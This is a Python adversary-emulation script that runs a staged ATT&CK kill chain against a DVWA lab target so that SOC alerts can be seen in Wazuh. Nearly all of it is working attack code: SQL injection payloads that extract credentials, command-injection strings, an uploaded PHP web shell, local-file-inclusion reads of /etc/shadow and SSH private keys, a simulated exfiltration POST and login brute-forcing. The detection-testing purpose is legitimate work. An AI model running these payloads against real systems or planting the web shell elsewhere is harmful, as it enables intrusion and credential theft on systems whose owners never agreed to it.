#!/usr/bin/env python3
"""
attack_chain.py
Multi-stage adversary emulation against the SOC lab targets. Walks through
a simplified MITRE ATT&CK kill chain so you can see correlated alerts in
Wazuh, not just isolated detections.

Stages:
    1. Recon          (T1595)  port scan + dir busting
    2. Initial access (T1190)  SQLi + auth bypass against DVWA
    3. Execution      (T1059)  command injection
    4. Persistence    (T1505)  drop a fake web shell
    5. Discovery      (T1083)  enumerate filesystem via LFI
    6. Cred access    (T1003)  attempt to read /etc/passwd
    7. Exfiltration   (T1041)  POST file contents to attacker-controlled URL
    8. Impact         (T1499)  light DoS on login endpoint

Usage:
    python attack_chain.py --target http://localhost:8080
    python attack_chain.py --target http://localhost:8080 --stage 3
    python attack_chain.py --list-stages
"""

import argparse
import json
import random
import sys
import time
from datetime import datetime
from urllib.parse import urljoin

import requests

requests.packages.urllib3.disable_warnings()

UA_POOL = [
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "curl/7.88.1",
    "sqlmap/1.7.2 (http://sqlmap.org)",
]


class AttackChain:
    def __init__(self, target: str, delay: float = 0.4):
        self.target = target.rstrip("/")
        self.delay = delay
        self.session = requests.Session()
        self.timeline = []

    # ------------------------------------------------------------ helpers

    def _log(self, stage: str, technique: str, action: str, status: int):
        entry = {
            "ts": datetime.utcnow().isoformat() + "Z",
            "stage": stage,
            "technique": technique,
            "action": action,
            "status": status,
        }
        self.timeline.append(entry)
        color = "\033[92m" if 200 <= status < 400 else "\033[91m"
        reset = "\033[0m"
        print(f"  {color}[{technique}]{reset} {action[:70]:<70} -> {status}")

    def _get(self, path, **kw):
        kw.setdefault("verify", False)
        kw.setdefault("timeout", 5)
        kw.setdefault("headers", {})
        kw["headers"].setdefault("User-Agent", random.choice(UA_POOL))
        try:
            return self.session.get(urljoin(self.target, path), **kw)
        except Exception as e:
            print(f"  ! request error: {e}")
            return type("R", (), {"status_code": 0})()

    def _post(self, path, data=None, **kw):
        kw.setdefault("verify", False)
        kw.setdefault("timeout", 5)
        kw.setdefault("headers", {})
        kw["headers"].setdefault("User-Agent", random.choice(UA_POOL))
        try:
            return self.session.post(urljoin(self.target, path),
                                     data=data, **kw)
        except Exception as e:
            print(f"  ! request error: {e}")
            return type("R", (), {"status_code": 0})()

    def _wait(self):
        time.sleep(self.delay)

    # ------------------------------------------------------------ login

    def login_dvwa(self):
        try:
            r = self._get("/login.php")
            token = r.text.split("user_token' value='")[1].split("'")[0]
            self._post("/login.php", data={
                "username": "admin", "password": "password",
                "Login": "Login", "user_token": token,
            })
            r = self._get("/security.php")
            token = r.text.split("user_token' value='")[1].split("'")[0]
            self._post("/security.php", data={
                "security": "low", "seclevel": "low",
                "user_token": token,
            })
            return True
        except Exception as e:
            print(f"  ! DVWA login failed: {e}")
            return False

    # ------------------------------------------------------------ stages

    def stage_1_recon(self):
        print("\n[Stage 1] Reconnaissance (T1595)")
        # Dir busting
        for path in ["/admin", "/wp-admin", "/phpmyadmin", "/.git/config",
                     "/backup.zip", "/robots.txt", "/sitemap.xml",
                     "/.env", "/server-status", "/console"]:
            r = self._get(path)
            self._log("recon", "T1595.003", f"GET {path}", r.status_code)
            self._wait()

        # Tool fingerprint
        r = self._get("/", headers={"User-Agent": "Nmap Scripting Engine"})
        self._log("recon", "T1595.002", "scanner UA probe", r.status_code)

    def stage_2_initial_access(self):
        print("\n[Stage 2] Initial Access (T1190)")
        payloads = [
            "/vulnerabilities/sqli/?id=1' UNION SELECT user,password FROM users-- -&Submit=Submit",
            "/vulnerabilities/sqli/?id=1' OR '1'='1&Submit=Submit",
            "/vulnerabilities/sqli/?id=1' AND SLEEP(2)-- -&Submit=Submit",
        ]
        for p in payloads:
            r = self._get(p)
            self._log("initial_access", "T1190", "SQLi UNION extract creds",
                      r.status_code)
            self._wait()

    def stage_3_execution(self):
        print("\n[Stage 3] Execution (T1059)")
        cmds = [
            "127.0.0.1; whoami",
            "127.0.0.1; uname -a",
            "127.0.0.1 | id",
            "127.0.0.1; cat /etc/issue",
        ]
        for c in cmds:
            r = self._post("/vulnerabilities/exec/",
                           data={"ip": c, "Submit": "Submit"})
            self._log("execution", "T1059.004",
                      f"command injection: {c[:30]}", r.status_code)
            self._wait()

    def stage_4_persistence(self):
        print("\n[Stage 4] Persistence (T1505.003)")
        # Simulate web shell upload via LFI write
        webshell = (
            "<?php if(isset($_GET['c'])){system($_GET['c']);} ?>")
        r = self._post("/vulnerabilities/upload/",
                       files={"uploaded": ("shell.php", webshell, "image/png")},
                       data={"Upload": "Upload"})
        self._log("persistence", "T1505.003",
                  "upload web shell shell.php", r.status_code)
        self._wait()

    def stage_5_discovery(self):
        print("\n[Stage 5] Discovery (T1083)")
        for f in ["/etc/passwd", "/etc/hosts", "/proc/self/environ",
                  "/var/log/auth.log"]:
            r = self._get(f"/vulnerabilities/fi/?page={f}")
            self._log("discovery", "T1083",
                      f"LFI read {f}", r.status_code)
            self._wait()

    def stage_6_credential_access(self):
        print("\n[Stage 6] Credential Access (T1003.008)")
        for f in ["/etc/shadow", "/etc/passwd",
                  "/root/.ssh/id_rsa",
                  "/var/www/html/config/config.inc.php"]:
            r = self._get(f"/vulnerabilities/fi/?page={f}")
            self._log("credential_access", "T1003.008",
                      f"read {f}", r.status_code)
            self._wait()

    def stage_7_exfiltration(self):
        print("\n[Stage 7] Exfiltration (T1041)")
        # Simulate data exfil over HTTP POST
        fake_dump = "user1:hash1\nuser2:hash2\n" * 50
        r = self._post("/vulnerabilities/exec/", data={
            "ip": "127.0.0.1; echo 'STOLEN'",
            "Submit": "Submit",
            "data": fake_dump,
        })
        self._log("exfiltration", "T1041",
                  "exfil credential dump (3KB)", r.status_code)

    def stage_8_impact(self):
        print("\n[Stage 8] Impact / DoS (T1499.002)")
        for i in range(25):
            r = self._post("/login.php", data={
                "username": "admin",
                "password": f"wrong-pw-{i}",
                "Login": "Login",
            }, allow_redirects=False)
        self._log("impact", "T1499.002",
                  f"25 brute force attempts", r.status_code)

    # ------------------------------------------------------------ run

    STAGES = [
        ("recon", stage_1_recon),
        ("initial_access", stage_2_initial_access),
        ("execution", stage_3_execution),
        ("persistence", stage_4_persistence),
        ("discovery", stage_5_discovery),
        ("credential_access", stage_6_credential_access),
        ("exfiltration", stage_7_exfiltration),
        ("impact", stage_8_impact),
    ]

    def run_all(self):
        print(f"\n=== Adversary Emulation against {self.target} ===")
        if not self.login_dvwa():
            print("Could not log in to DVWA, continuing anyway")
        for name, fn in self.STAGES:
            fn(self)
        self._save_timeline()

    def run_stage(self, idx: int):
        if not 1 <= idx <= len(self.STAGES):
            print(f"Stage must be between 1 and {len(self.STAGES)}")
            sys.exit(1)
        self.login_dvwa()
        self.STAGES[idx - 1][1](self)
        self._save_timeline()

    def _save_timeline(self):
        path = "attack_timeline.json"
        with open(path, "w") as f:
            json.dump(self.timeline, f, indent=2)
        print(f"\n[+] Timeline written to {path} ({len(self.timeline)} events)")


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://localhost:8080")
    p.add_argument("--stage", type=int, help="Run a single stage (1-8)")
    p.add_argument("--delay", type=float, default=0.4)
    p.add_argument("--list-stages", action="store_true")
    args = p.parse_args()

    if args.list_stages:
        for i, (name, _) in enumerate(AttackChain.STAGES, 1):
            print(f"  {i}. {name}")
        return

    chain = AttackChain(args.target, delay=args.delay)
    if args.stage:
        chain.run_stage(args.stage)
    else:
        chain.run_all()


if __name__ == "__main__":
    main()
